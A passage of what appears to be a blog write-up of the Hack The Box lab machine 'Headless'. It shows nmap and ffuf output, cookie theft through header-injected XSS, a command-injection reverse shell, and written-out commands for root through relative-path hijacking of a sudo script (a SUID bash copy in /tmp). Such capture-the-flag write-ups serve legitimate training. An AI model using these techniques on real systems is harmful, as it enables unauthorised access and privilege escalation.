+SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
+SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
+SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
+SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"&lt;!DOCTYP
+SF:E\x20HTML&gt;\n&lt;html\x20lang=\"en\"&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20
+SF:\x20\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x20\x20\x
+SF:20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x
+SF:20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20resp
+SF:onse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;
+SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20vers
+SF:ion\x20\('RTSP/1\.0'\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\
+SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
+SF:20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jul 20 19:18:09 2024 -- 1 IP address (1 host up) scanned in 131.76 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>There is port 22 for ssh and a 5000 for http, let’s take a look at http service.</p>
+    
+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>The 5000 port seems like a python werkzeug web server as saw in the headers:</p>
+
+<pre><code class="language-bash">❯ curl -i -s http://10.10.11.8:5000 | head
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.11.2
+Date: Sat, 20 Jul 2024 17:19:55 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2799
+Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+Connection: close
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+</code></pre>
+
+<p>There is a cookie <code>is_admin</code> which is interesting. Looking in the browser, there’s a support questions page:</p>
+
+<p><img src="/assets/images/Headless/main-page.png" alt="main page"></p>
+
+<p><img src="/assets/images/Headless/support-page.png" alt="support page"></p>
+
+<p>Fuzzing for valid routes, its possible to see /dashboard which returns 500:</p>
+
+<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.8:5000/FUZZ -mc all -fc 404 -t 100
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.8:5000/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: all
+ :: Filter           : Response status: 404
+________________________________________________
+
+dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 229ms]
+support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 181ms]
+:: Progress: [4727/4727] :: Job [1/1] :: 64 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
+</code></pre>
+
+<p>If we insert a <code>&lt;&gt;</code> for html injection in the support fields it says “Hacking attempt detected”:</p>
+
+<p><img src="/assets/images/Headless/&lt;&gt;hacking-attempt-dettected.png" alt="&lt;&gt; hacking attempt detected"></p>
+
+<p>And it reflects our headers in the page saying that the browser information has been sent to the administrators:</p>
+
+<p><img src="/assets/images/Headless/request-headers-sent-to-administrators.png" alt="request headers sent to administrators"></p>
+
+<p>The HTML its successfully injected when put in the headers:</p>
+
+<p><img src="/assets/images/Headless/html-injection-successfull.png" alt="html injection successfull"></p>
+
+<p>In case this data is reviewed by the administrators, I can send myself a cookie of him. First I will start an http server:</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>And trigger the xss:</p>
+
+<p><img src="/assets/images/Headless/xss-triggered.png" alt="xss triggered"></p>
+
+<p>I’m able to receive the cookie of some administrator from 10.10.11.8 which is the machine’s IP:</p>
+
+<p><img src="/assets/images/Headless/cookie-received.png" alt="cookie received"></p>
+
+<p>I will insert it, navigate to /dashboard and see I have access:</p>
+
+<p><img src="/assets/images/Headless/access-to-dashboard.png" alt="access to dashboard"></p>
+    
+      <h1 id="access-as-dvir">
+        
+        
+          Access as dvir <a href="#access-as-dvir" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Clicking on “Generate Report”, I see its passing a date parameter:</p>
+
+<p><img src="/assets/images/Headless/date-parameter-dashbaord.png" alt="date parameter dashboard"></p>
+
+<p>Testing command injection works:</p>
+
+<p><img src="/assets/images/Headless/command-injection-works.png" alt="command injection works"></p>
+
+<p>So I will run the typical reverse shell command to gain access as dvir. First spawn a nc listener:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p>Trigger the reverse shell:</p>
+
+<p><img src="/assets/images/Headless/reverse-shell-triggered.png" alt="reverse shell triggered"></p>
+
+<p>We receive a shell as dvir and successfully can see user.txt:</p>
+
+<p><img src="/assets/images/Headless/shell-as-dvir.png" alt="shell as dvir"></p>
+
+<pre><code class="language-bash">dvir@headless:~/app$ cd
+cd
+dvir@headless:~$ ls
+ls
+app
+geckodriver.log
+user.txt
+dvir@headless:~$ cat user.txt
+cat user.txt
+b8****************************00
+</code></pre>
+
+<p>Let’s do the common tty trick to have a completely interactive shell where we can do ctrl+l, ctrl+c without killing the shell, etc:</p>
+
+<pre><code class="language-bash">dvir@headless:~$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+dvir@headless:~$ ^Z
+[1]  + 41760 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 41760 continued  nc -lvnp 443
+                                    reset xterm
+dvir@headless:~$ export TERM=xterm
+dvir@headless:~$ export SHELL=bash
+dvir@headless:~$ stty rows 50 columns 184
+</code></pre>
+
+<ul>
+  <li>
+<code>script /dev/null -c bash</code>: Spawns a tty.</li>
+  <li>
+<code>ctrl+z</code>: puts the shell in background for later doing a treatment.</li>
+  <li>
+<code>stty raw -echo;fg</code>: give us the shell back again.</li>
+  <li>
+<code>reset xterm</code>: resets the terminal to give us the bash console.</li>
+  <li>
+<code>export TERM=xterm</code>: let us do ctrl+l to clean the terminal.</li>
+  <li>
+<code>export SHELL=bash</code>: specifies the system that we are using a bash console.</li>
+  <li>
+<code>stty rows &lt;YOUR ROWS&gt; columns &lt;YOUR COLUMNS&gt;</code>: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you 
+can view it with <code>stty size</code> in a complete new window).</li>
+</ul>
+    
+      <h1 id="access-as-root">
+        
+        
+          Access as root <a href="#access-as-root" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Looking at the sudo privileges, we can see that we can run as any user without a password <code>/usr/bin/syscheck</code>:</p>
+
+<pre><code class="language-bash">dvir@headless:~$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+</code></pre>
+
+<p>Running it gives us some info about the system, such as the last kernel modification time, free space on disk and seems to try to run some database service:</p>
+
+<pre><code class="language-bash">dvir@headless:~$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.12, 0.03, 0.01
+Database service is not running. Starting it...
+</code></pre>
+
+<p>This file is a shell script:</p>
+
+<pre><code class="language-bash">dvir@headless:~$ file /usr/bin/syscheck 
+/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
+</code></pre>
+
+<p>First, if the user id’s its not root, exits the program:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+</code></pre>
+
+<p>Second, it executes safely some commands to see the last time vmlinux was modified:</p>
+
+<pre><code class="language-bash">last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+</code></pre>
+
+<p>Also see the available disk space and system load average (also safely):</p>
+
+<pre><code class="language-bash">disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+</code></pre>
+
+<p>Finally, it checks if initdb.sh its running and if not, it runs ./initdb.sh to start it:</p>
+
+<pre><code class="language-bash">if ! /usr/bin/pgrep -x "initdb.sh" &amp;&gt;/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2&gt;/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+</code></pre>
+
+<p>This is very dangerous since its not calling an absolute path and can execute any bash file in the current directory. I will create initdb.sh in /tmp with a instruction to copy the bash to /tmp and make it SUID. Then, I will execute <code>/usr/bin/syscheck</code> to call ./initdb.sh.</p>
+
+<pre><code class="language-bash">dvir@headless:/tmp$ cd /tmp
+dvir@headless:/tmp$ echo 'cp /bin/bash /tmp; chmod u+s /tmp/bash' &gt; initdb.sh
+dvir@headless:/tmp$ chmod +x initdb.sh 
+dvir@headless:/tmp$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.00, 0.00, 0.00
+Database service is not running. Starting it...
+dvir@headless:/tmp$ ls -l bash 
+-rwsr-xr-x 1 root root 1265648 Jul 21 20:02 bash
+</code></pre>
+
+<p>Finally, I can execute <code>/tmp/bash</code> with <code>-p</code> parameter:</p>
+
+<pre><code class="language-bash">dvir@headless:/tmp$ ./bash -p
+bash-5.2# whoami
+root
+</code></pre>
+
+<p>And we have access as root! Now we can see root.txt:</p>
+
+<pre><code class="language-bash">bash-5.2# cd /root/
+bash-5.2# cat root.txt 
+b0****************************a6
+</code></pre>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>20 July 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=xss" class="tag" style="font-family: 'Cascadia Code';">xss</a>
+    
+    <a href="/search?q=command-injection" class="tag" style="font-family: 'Cascadia Code';">command-injection</a>
+    
+    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
+    
+    <a href="/search?q=path-hijacking-./" class="tag" style="font-family: 'Cascadia Code';">path-hijacking-./</a>
+    
+    
+</div>
+  <br>
+  Share this writeup: 
+  <a href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Headless.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-facebook-official" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Headless.html&amp;text=Writeup+for+HTB%20Headless%20writeup+from+HTB+held+on+20%20July%202024&amp;hashtags=ctf,writeup,Headless,HTB,xss,command-injection,sudoers,path-hijacking-./','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-twitter" aria-hidden="true"></i></a> 
+  <a href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Headless.html&amp;text=Writeup+for+HTB%20Headless%20writeup+from+HTB+held+on+2024-07-20%2000:00:00%20+0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
